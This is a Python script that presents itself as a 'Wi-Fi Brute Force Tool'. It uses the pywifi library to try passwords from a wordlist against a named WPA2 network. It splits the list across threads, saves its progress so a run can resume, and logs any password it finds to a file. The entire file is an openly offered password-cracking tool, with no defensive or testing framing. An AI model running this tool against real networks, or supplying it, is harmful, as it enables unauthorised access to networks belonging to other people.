import pywifi
from pywifi import const
import time
import argparse
from threading import Thread, Lock
import os
import signal
import sys
from datetime import datetime

# File to save the last tested password index
LAST_TESTED_FILE = "last_tested.txt"
FOUND_PASSWORD_FILE = "found_password.txt"

# Lock for synchronization
lock = Lock()

# Function to check Wi-Fi SSID availability
def check_ssid_availability(ssid, interface):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[interface]
    
    available_networks = iface.scan_results()
    for network in available_networks:
        if network.ssid == ssid:
            return True
    return False

# Function to check connection status
def check_connection(interface):
    for _ in range(10):  # Allow 10 seconds for connection
        if interface.status() == const.IFACE_CONNECTED:
            return True
        time.sleep(1)
    return False

# Function to test a password
def test_password(ssid, password, interface):
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    interface.remove_all_network_profiles()
    temp_profile = interface.add_network_profile(profile)

    interface.connect(temp_profile)
    print(f"[*] Testing password: '{password}' (length: {len(password)})...")

    if check_connection(interface):
        print(f"[+] Password found: '{password}' (Connected to {ssid})")
        return True
    else:
        print(f"[-] Password '{password}' failed.")
        interface.disconnect()
        time.sleep(1)  # Avoid flooding the network
        return False

# Worker thread for multithreading
def worker(ssid, passwords, interface, thread_id, start_idx, result_dict):
    tested_count = 0
    incorrect_count = 0
    found_password = None
    start_time = time.time()
    
    for idx, password in enumerate(passwords):
        current_idx = start_idx + idx
        tested_count += 1
        if test_password(ssid, password, interface):
            found_password = password
            result_dict['found'] = True
            result_dict['password'] = password
            result_dict['time_taken'] = time.time() - start_time  # Track time when password is found
            break
        else:
            incorrect_count += 1
        
        save_progress(current_idx)
    
    result_dict['tested'] += tested_count
    result_dict['incorrect'] += incorrect_count
    result_dict['time_taken'] = time.time() - start_time

# Save the last tested password index to a file
def save_progress(index):
    with open(LAST_TESTED_FILE, "w") as file:
        file.write(str(index))

# Read the last tested password index from the file
def load_progress(total_passwords):
    if os.path.exists(LAST_TESTED_FILE):
        try:
            with open(LAST_TESTED_FILE, "r") as file:
                last_tested_index = int(file.read().strip())
                # Ensure it's within the valid range
                if last_tested_index < 0:
                    return 0
                elif last_tested_index >= total_passwords:
                    return total_passwords - 1  # Default to last valid index
                else:
                    return last_tested_index
        except ValueError:
            return 0  # Handle case where file content isn't a valid integer
    return 0  # Default to starting from the first password

# Graceful exit handler
def signal_handler(sig, frame):
    print("\n[!] Quitting the program...")
    sys.exit(0)

# Function to append to the found password file
def append_to_found_password_file(ssid, password):
    # Check if the password is already in the file
    with open(FOUND_PASSWORD_FILE, "r", encoding="utf-8") as file:
        found_entries = file.readlines()
        # Avoid overwriting or appending duplicates
        for line in found_entries:
            if f"SSID: {ssid} | Found password: {password}" in line:
                return  # Password already written, skip it

    # Append the new password with a timestamp
    with open(FOUND_PASSWORD_FILE, "a", encoding="utf-8") as file:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        file.write(f"SSID: {ssid} | Found password: {password} | Date: {timestamp}\n")

# Main function
def main(ssid, wordlist, num_threads, start, end, interface):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[interface]

    # Check if SSID is available
    print(f"[*] Checking availability of SSID: {ssid}...")
    if not check_ssid_availability(ssid, interface):
        print(f"[-] SSID {ssid} is not available.")
        sys.exit(1)
    
    with open(wordlist, "r", encoding="utf-8") as file:
        # Reading and preparing the password list
        passwords = [line.strip() for line in file]

    # Handling cases where start/end might be non-integer indices
    try:
        start = int(start)
        end = int(end) if end is not None else len(passwords)
    except ValueError:
        pass  # If conversion fails, we'll treat start and end as indices for string slicing

    # Ensure start and end indices are handled correctly
    passwords = passwords[start:end] if end else passwords[start:]

    # Load the last tested index
    last_tested_index = load_progress(len(passwords))
    print(f"[+] Resuming from password index: {last_tested_index}")

    # Skip already tested passwords
    passwords = passwords[last_tested_index:]

    chunk_size = len(passwords) // num_threads
    threads = []
    result_dict = {
        'tested': 0,
        'incorrect': 0,
        'found': False,
        'password': None,
        'time_taken': 0
    }

    for i in range(num_threads):
        start_idx = i * chunk_size
        end_idx = start_idx + chunk_size if i != num_threads - 1 else len(passwords)
        thread_passwords = passwords[start_idx:end_idx]

        thread = Thread(target=worker, args=(ssid, thread_passwords, iface, i + 1, last_tested_index + start_idx, result_dict))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    # Summary
    if result_dict['found']:
        print(f"\n[+] Password found: '{result_dict['password']}' (SSID: {ssid})")
        # Save the found password to the file
        append_to_found_password_file(ssid, result_dict['password'])
    else:
        print(f"\n[-] Passwords testing completed. No password found for SSID: {ssid}")
        # Reset last tested index if no password is found
        save_progress(0)
    
    print(f"\nSummary:")
    print(f"SSID tested: {ssid}")
    print(f"Found password: {result_dict['password'] if result_dict['found'] else 'Not found'}")
    print(f"Incorrect passwords: {result_dict['incorrect']}")
    print(f"Total passwords tested before finding the password: {result_dict['tested']}")
    print(f"Time taken to find the correct password: {result_dict['time_taken']:.2f} seconds")

if __name__ == "__main__":
    # Register signal handler for graceful quit (Ctrl+C)
    signal.signal(signal.SIGINT, signal_handler)

    parser = argparse.ArgumentParser(description="Wi-Fi Brute Force Tool")
    parser.add_argument("ssid", type=str, help="SSID of the Wi-Fi network")
    parser.add_argument("wordlist", type=str, help="Path to the password wordlist")
    parser.add_argument("--threads", type=int, default=4, help="Number of threads to use (default: 4)")
    parser.add_argument("--start", type=str, default="0", help="Start index in the wordlist (default: 0)")
    parser.add_argument("--end", type=str, default=None, help="End index in the wordlist (default: None)")

    args = parser.parse_args()

    # Running the main function
    main(args.ssid, args.wordlist, args.threads, args.start, args.end, 0)  # Interface 0 is assumed